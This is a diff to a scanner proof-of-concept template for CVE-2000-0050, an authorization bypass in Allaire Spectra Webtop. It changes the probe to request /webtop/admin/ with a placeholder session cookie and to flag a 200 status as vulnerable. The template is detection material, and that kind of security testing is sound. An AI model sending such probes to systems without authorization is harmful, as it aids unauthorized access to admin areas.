@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 Allaire Spectra Webtop 越权访问漏洞：已认证用户通过构造显式 URL 可访问其他 Webtop 功能模块"
+author = "ave"
+description = "验证 Allaire Spectra 1.0 Webtop 是否存在授权绕过漏洞。攻击者以普通用户身份登录后，直接访问无权限的 Webtop 分区 URL（如 /webtop/admin/），若服务器返回 200 而非重定向或拒绝，则存在越权访问漏洞"
 id = "POC-AVE-2000-0042"
-name = "CVE-2000-0050 PoC"
+name = "Allaire Spectra Webtop 授权绕过漏洞 PoC"
 severity = "medium"
 tags = ["ave-2000-0042"]
 vuln_id = [
@@ -15,14 +15,13 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/webtop/restricted/section"
+path = "/{{BaseURL}}/webtop/admin/"
 protocol = "http"
+
+[poc.requests.headers]
+Cookie = "spectra_session=authenticated_user_session"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "Webtop",
-    "Spectra",
-]
+status = [200]
+type = "status"
